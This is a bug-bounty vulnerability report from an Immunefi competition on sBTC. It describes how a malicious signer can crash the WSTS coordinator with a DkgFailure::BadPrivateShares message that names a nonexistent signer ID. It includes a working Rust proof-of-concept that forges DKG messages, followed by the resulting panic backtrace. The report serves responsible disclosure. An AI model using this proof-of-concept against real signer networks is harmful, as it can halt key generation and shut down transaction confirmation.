# #40731 \[BC-Medium] A malicious signer can force a panic in the coordinator by sending \`DkgFailure::BadPrivateShares\` with an invalid signer ID

**Submitted on Mar 2nd 2025 at 12:12:26 UTC by @christ0s for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #40731
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/stacks-network/sbtc/blob/immunefi\\_attackaton\\_1.0/Cargo.toml#L31>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

A malicious signer can cause the coordinator to panic by submitting a `DkgFailure::BadPrivateShares` message that contains references to non-existent signer IDs. The panic happens because the coordinator attempts to access entries in its internal maps without first validating that the keys exist. This vulnerability allows any malicious signer to completely halt the DKG process, preventing the formation of new signer sets and effectively stopping the network from processing transactions.

## Vulnerability Details

In the coordinator's state machine, when processing a `DkgStatus::Failure` with `BadPrivateShares`, the code attempts to directly access internal maps with the reported signer IDs without first checking if those IDs actually exist:

```
// in wsts/src/state_machine/coordinator/fire.rs
DkgFailure::BadPrivateShares(bad_shares) => {
    // bad_shares is a map of signer_id to BadPrivateShare
    for (bad_signer_id, bad_private_share) in bad_shares {
        // ... code that attempts verification ...
        
        // This line causes a panic if bad_signer_id doesn't exist in the map
        let dkg_public_shares = &self.dkg_public_shares[bad_signer_id]
            .comms
            .iter()
            .cloned()
            .collect::<HashMap<u32, PolyCommitment>>();
            
        // This also causes a panic if bad_signer_id doesn't exist
        // uses direct access and not .get()
        let dkg_private_shares = &self.dkg_private_shares[bad_signer_id];
        
        // ... rest of verification code ...
    }
}
```

## Proof of Concept

## Proof of Concept

You can add the following code in the `transactions_signer.rs` in `WstsNetMessage::DkgEndBegin(request) => {` and run the following test:`RUST_BACKTRACE=FULL RUST_LOG=wsts=trace,debug cargo test --package signer --test integration -- transaction_coordinator::sign_bitcoin_transaction --exact --show-output --nocapture`

```rust
// === DKG END-BEGIN ===
            WstsNetMessage::DkgEndBegin(request) => {
                span.record(WSTS_DKG_ID, request.dkg_id);

                if !chain_tip_report.is_from_canonical_coordinator() {
                    tracing::warn!(
                        ?chain_tip_report,
                        "received coordinator message from a non canonical coordinator"
                    );
                    return Ok(());
                }

                let launch_panic_attack = true;

                if launch_panic_attack {
                    println!("PANIC VULNERABILITY DEMO: BadPrivateShares with invalid signer ID");
                    
                    // Import required types
                    use wsts::common::TupleProof;
                    use wsts::curve::point::{G, Point};
                    use wsts::curve::scalar::Scalar;
                    use hashbrown::HashMap;
                    use rand::rngs::OsRng;
                    
                    // Get a real signer ID to use as the attacker
                    if let Some(&attacker_id) = request.signer_ids.first() {
                        // Create a valid tuple proof
                        let mut rng = OsRng;
                        let a = Scalar::random(&mut rng);
                        let A = Point::from(a);
                        let B = G;
                        let K = a * B;
                        let tuple_proof = TupleProof::new(&a, &A, &B, &K, &mut rng);
                        
                        // Create a single BadPrivateShare
                        let bad_private_share = wsts::net::BadPrivateShare {
                            shared_key: K,
                            tuple_proof,
                        };
                        
                        // Create a BadPrivateShares map with a single entry
                        let mut bad_shares_map = HashMap::new();
                        
                        // Use a signer ID that definitely doesn't exist (9999)
                        let non_existent_signer_id = 9999;
                        bad_shares_map.insert(non_existent_signer_id, bad_private_share);
                        
                        println!("Targeting non-existent signer ID {} to trigger panic", non_existent_signer_id);
                        
                        // Create the attack message
                        let dkg_failure = DkgFailure::BadPrivateShares(bad_shares_map);
                        
                        // First, clear out the waiting list by sending success messages for other signers
                        for &signer_id in request.signer_ids.iter().skip(1) {
                            let success_msg = message::WstsMessage { 
                                id: msg.id,
                                inner: WstsNetMessage::DkgEnd(DkgEnd {
                                    dkg_id: request.dkg_id,
                                    signer_id,
                                    status: DkgStatus::Success,
                                })
                            };
                            self.send_message(success_msg, &chain_tip.block_hash).await?;
                        }
                        
                        // Send the panic-inducing message
                        let panic_msg = message::WstsMessage { 
                            id: msg.id,
                            inner: WstsNetMessage::DkgEnd(DkgEnd {
                                dkg_id: request.dkg_id,
                                signer_id: attacker_id,
                                status: DkgStatus::Failure(dkg_failure),
                            })
                        };
                        self.send_message(panic_msg, &chain_tip.block_hash).await?;
                        
                        println!("Panic attack message sent!");
                        println!("The coordinator will panic with: thread panicked at 'no entry found for key");
                        return Ok(());
                    }
                }

                // Normal processing
                tracing::debug!("processing message normally");
                let state_machine_id = StateMachineId::Dkg(*chain_tip);
                self.relay_message(
                    &state_machine_id,
                    msg.id,
                    msg_public_key,
                    None,
                    &msg.inner,
                    &chain_tip.block_hash,
                )
                .await?;
            }

            // === DKG END ===
            WstsNetMessage::DkgEnd(request) => {
            . . . 
```

Then we can see the logs:

```
running 1 test
PANIC VULNERABILITY DEMO: BadPrivateShares with invalid signer ID
Targeting non-existent signer ID 9999 to trigger panic
Panic attack message sent!
The coordinator will panic with: thread panicked at 'no entry found for key
PANIC VULNERABILITY DEMO: BadPrivateShares with invalid signer ID
Targeting non-existent signer ID 9999 to trigger panic
Panic attack message sent!
The coordinator will panic with: thread panicked at 'no entry found for key
PANIC VULNERABILITY DEMO: BadPrivateShares with invalid signer ID
Targeting non-existent signer ID 9999 to trigger panic
Panic attack message sent!
The coordinator will panic with: thread panicked at 'no entry found for key
thread 'transaction_coordinator::sign_bitcoin_transaction' panicked at /Users/useeeeer/.cargo/registry/src/index.crates.io-6f17d22bba15001f/wsts-13.0.1/src/state_machine/coordinator/fire.rs:607:68:
no entry found for key
stack backtrace:
   0: _rust_begin_unwind
   1: core::panicking::panic_fmt
   2: core::option::expect_failed
   3: core::option::Option<T>::expect
   4: <hashbrown::map::HashMap<K,V,S,A> as core::ops::index::Index<&Q>>::index
   5: wsts::state_machine::coordinator::fire::Coordinator<Aggregator>::gather_dkg_end
   6: wsts::state_machine::coordinator::fire::Coordinator<Aggregator>::process_message
   7: <signer::wsts_state_machine::FireCoordinator as signer::wsts_state_machine::WstsCoordinator>::process_packet
   8: signer::wsts_state_machine::WstsCoordinator::process_message
   9: signer::transaction_coordinator::TxCoordinatorEventLoop<C,N>::drive_wsts_state_machine::{{closure}}::{{closure}}
  10: signer::transaction_coordinator::TxCoordinatorEventLoop<C,N>::drive_wsts_state_machine::{{closure}}
  11: <tokio::time::timeout::Timeout<T> as core::future::future::Future>::poll
  12: signer::transaction_coordinator::TxCoordinatorEventLoop<C,N>::coordinate_dkg::{{closure}}::{{closure}}
  13: signer::transaction_coordinator::TxCoordinatorEventLoop<C,N>::coordinate_dkg::{{closure}}
  14: signer::transaction_coordinator::TxCoordinatorEventLoop<C,N>::process_new_blocks::{{closure}}::{{closure}}
  15: signer::transaction_coordinator::TxCoordinatorEventLoop<C,N>::process_new_blocks::{{closure}}
  16: signer::transaction_coordinator::TxCoordinatorEventLoop<C,N>::run::{{closure}}::{{closure}}
  17: signer::transaction_coordinator::TxCoordinatorEventLoop<C,N>::run::{{closure}}
  18: integration::transaction_coordinator::sign_bitcoin_transaction::{{closure}}::{{closure}}
  19: <core::pin::Pin<P> as core::future::future::Future>::poll
  20: tokio::runtime::task::core::Core<T,S>::poll::{{closure}}
  21: tokio::runtime::task::core::Core<T,S>::poll
  22: tokio::runtime::task::harness::poll_future::{{closure}}
  23: <core::panic::unwind_safe::AssertUnwindSafe<F> as core::ops::function::FnOnce<()>>::call_once
  24: std::panicking::try::do_call
  25: ___rust_try
  26: std::panic::catch_unwind
  27: tokio::runtime::task::harness::poll_future
  28: tokio::runtime::task::harness::Harness<T,S>::poll_inner
  29: tokio::runtime::task::harness::Harness<T,S>::poll
  30: tokio::runtime::task::raw::poll
  31: tokio::runtime::task::raw::RawTask::poll
  32: tokio::runtime::task::LocalNotified<S>::run
  33: tokio::runtime::scheduler::current_thread::CoreGuard::block_on::{{closure}}::{{closure}}
  34: tokio::runtime::scheduler::current_thread::Context::run_task::{{closure}}
  35: tokio::runtime::scheduler::current_thread::Context::enter
  36: tokio::runtime::scheduler::current_thread::Context::run_task
  37: tokio::runtime::scheduler::current_thread::CoreGuard::block_on::{{closure}}
  38: tokio::runtime::scheduler::current_thread::CoreGuard::enter::{{closure}}
  39: tokio::runtime::context::scoped::Scoped<T>::set
  40: tokio::runtime::context::set_scheduler::{{closure}}
  41: std::thread::local::LocalKey<T>::try_with
  42: std::thread::local::LocalKey<T>::with
  43: tokio::runtime::context::set_scheduler
  44: tokio::runtime::scheduler::current_thread::CoreGuard::enter
  45: tokio::runtime::scheduler::current_thread::CoreGuard::block_on
  46: tokio::runtime::scheduler::current_thread::CurrentThread::block_on::{{closure}}
  47: tokio::runtime::context::runtime::enter_runtime
  48: tokio::runtime::scheduler::current_thread::CurrentThread::block_on
  49: tokio::runtime::runtime::Runtime::block_on_inner
  50: tokio::runtime::runtime::Runtime::block_on
  51: integration::transaction_coordinator::sign_bitcoin_transaction
  52: integration::transaction_coordinator::sign_bitcoin_transaction::{{closure}}
  53: core::ops::function::FnOnce::call_once
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
```
